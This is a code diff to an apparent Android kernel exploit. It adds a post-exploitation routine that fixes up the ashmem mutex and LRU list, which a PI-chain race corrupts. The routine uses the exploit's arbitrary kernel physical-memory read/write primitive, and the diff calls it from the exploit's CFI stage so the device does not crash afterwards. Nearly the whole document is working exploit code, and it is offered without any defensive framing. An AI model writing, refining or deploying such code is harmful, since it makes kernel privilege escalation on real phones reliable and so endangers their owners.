@@ -100,6 +100,166 @@ static int fake_fops_owner_is_zero(int fd) {
   return 1;
 }
 
+#if defined(ASHMEM_MUTEX_OFF)
+/*
+ * The PI chain race writes collateral data into .data objects near
+ * the exploit target (ashmem_miscs).  The global ashmem_mutex sits
+ * 176 bytes before ashmem_miscs[0] and is the most frequent crash
+ * site: any subsequent ashmem_mmap / ashmem_ioctl dereferences the
+ * corrupted wait_list and panics.
+ *
+ * struct mutex layout (48 bytes, from BTF):
+ *   +0   owner            (atomic_long_t, 8B)
+ *   +8   wait_lock        (spinlock_t,    4B)
+ *   +12  osq              (optimistic_spin_queue, 4B)
+ *   +16  wait_list.next   (list_head,     8B)
+ *   +24  wait_list.prev   (list_head,     8B)
+ *   +32  android_oem_data1                16B
+ *
+ * A clean unlocked mutex has owner=0, wait_lock=0, osq=0,
+ * wait_list pointing to itself, and oem_data zeroed.
+ */
+
+#define MUTEX_SIZE          48
+#define MUTEX_OWNER_OFF     0
+#define MUTEX_WAITLOCK_OFF  8
+#define MUTEX_OSQ_OFF       12
+#define MUTEX_WAITLIST_OFF  16
+#define MUTEX_OEM_OFF       32
+
+static int is_kernel_ptr(uint64_t val) {
+  return (val & 0xffff000000000000ULL) == 0xffff000000000000ULL;
+}
+
+static int mutex_looks_corrupt(const uint8_t *buf) {
+  uint64_t owner;
+  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
+  if (owner != 0 && !is_kernel_ptr(owner)) {
+    return 1;
+  }
+  uint64_t wl_next;
+  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
+  if (wl_next != 0 && !is_kernel_ptr(wl_next)) {
+    return 1;
+  }
+  return 0;
+}
+
+static void dump_hex_line(const char *label, const uint8_t *buf, size_t len) {
+  char hex[MUTEX_SIZE * 3 + 1];
+  size_t pos = 0;
+  for (size_t i = 0; i < len && pos + 3 < sizeof(hex); i++) {
+    pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[i]);
+  }
+  pr_info("%s: %s\n", label, hex);
+}
+
+static int repair_ashmem_mutex(int fd) {
+  uintptr_t mutex_direct = data_addr(ASHMEM_MUTEX);
+  uintptr_t mutex_canon = canon_addr(ASHMEM_MUTEX);
+
+  uint8_t buf[MUTEX_SIZE];
+  memset(buf, 0, sizeof(buf));
+
+  if (!pipe_phys_read_data(fd, mutex_direct, buf, MUTEX_SIZE)) {
+    pr_warning("ashmem-repair: failed to read mutex at direct=%016zx\n",
+               mutex_direct);
+    return 0;
+  }
+
+  dump_hex_line("ashmem-repair mutex-before", buf, MUTEX_SIZE);
+
+  if (!mutex_looks_corrupt(buf)) {
+    pr_info("ashmem-repair: mutex looks clean, skipping repair\n");
+    return 1;
+  }
+
+  uint64_t owner;
+  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
+  uint64_t wl_next;
+  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
+  pr_warning("ashmem-repair: CORRUPT mutex owner=%016llx waitlist.next=%016llx\n",
+             (unsigned long long)owner, (unsigned long long)wl_next);
+
+  uint8_t clean[MUTEX_SIZE];
+  memset(clean, 0, sizeof(clean));
+  uint64_t self = mutex_canon + MUTEX_WAITLIST_OFF;
+  memcpy(clean + MUTEX_WAITLIST_OFF, &self, 8);
+  memcpy(clean + MUTEX_WAITLIST_OFF + 8, &self, 8);
+
+  if (!pipe_phys_write_data(fd, mutex_direct, clean, MUTEX_SIZE)) {
+    pr_warning("ashmem-repair: failed to write clean mutex\n");
+    return 0;
+  }
+
+  uint8_t verify[MUTEX_SIZE];
+  memset(verify, 0, sizeof(verify));
+  if (!pipe_phys_read_data(fd, mutex_direct, verify, MUTEX_SIZE)) {
+    pr_warning("ashmem-repair: failed to read back mutex\n");
+    return 0;
+  }
+
+  dump_hex_line("ashmem-repair mutex-after ", verify, MUTEX_SIZE);
+
+  if (memcmp(clean, verify, MUTEX_SIZE) != 0) {
+    pr_warning("ashmem-repair: readback mismatch\n");
+    return 0;
+  }
+
+  pr_success("ashmem-repair: mutex repaired at %016zx\n", mutex_direct);
+  return 1;
+}
+
+static int repair_ashmem_lru_list(int fd) {
+  uintptr_t lru_direct = data_addr(ASHMEM_LRU_LIST);
+  uintptr_t lru_canon = canon_addr(ASHMEM_LRU_LIST);
+
+  uint8_t buf[16];
+  if (!pipe_phys_read_data(fd, lru_direct, buf, 16)) {
+    pr_warning("ashmem-repair: failed to read lru_list\n");
+    return 0;
+  }
+
+  uint64_t next, prev;
+  memcpy(&next, buf, 8);
+  memcpy(&prev, buf + 8, 8);
+
+  pr_info("ashmem-repair lru_list next=%016llx prev=%016llx\n",
+          (unsigned long long)next, (unsigned long long)prev);
+
+  if (next != 0 && !is_kernel_ptr(next)) {
+    pr_warning("ashmem-repair: lru_list corrupted, resetting to empty\n");
+    uint64_t self = lru_canon;
+    uint8_t clean[16];
+    memcpy(clean, &self, 8);
+    memcpy(clean + 8, &self, 8);
+    if (!pipe_phys_write_data(fd, lru_direct, clean, 16)) {
+      pr_warning("ashmem-repair: failed to write lru_list\n");
+      return 0;
+    }
+    pr_success("ashmem-repair: lru_list repaired\n");
+  }
+  return 1;
+}
+
+static int repair_ashmem_region(int fd) {
+  pr_info("ashmem-repair: starting post-exploit .data repair\n");
+  pr_info("ashmem-repair: mutex_direct=%016zx mutex_canon=%016zx\n",
+          data_addr(ASHMEM_MUTEX), canon_addr(ASHMEM_MUTEX));
+
+  int mutex_ok = repair_ashmem_mutex(fd);
+  int lru_ok = repair_ashmem_lru_list(fd);
+
+  if (mutex_ok && lru_ok) {
+    pr_success("ashmem-repair: all repairs completed\n");
+  } else {
+    pr_warning("ashmem-repair: some repairs failed mutex=%d lru=%d\n",
+               mutex_ok, lru_ok);
+  }
+  return mutex_ok;
+}
+#endif
+
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 static int route_delay_usec(int attempt) {
   const char *forced = getenv("PSELECT_DELAY_USEC");
@@ -552,6 +712,10 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     goto fail;
   }
+
+#if defined(ASHMEM_MUTEX_OFF)
+  repair_ashmem_region(fd);
+#endif
 
   uint64_t after = 0;
   ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
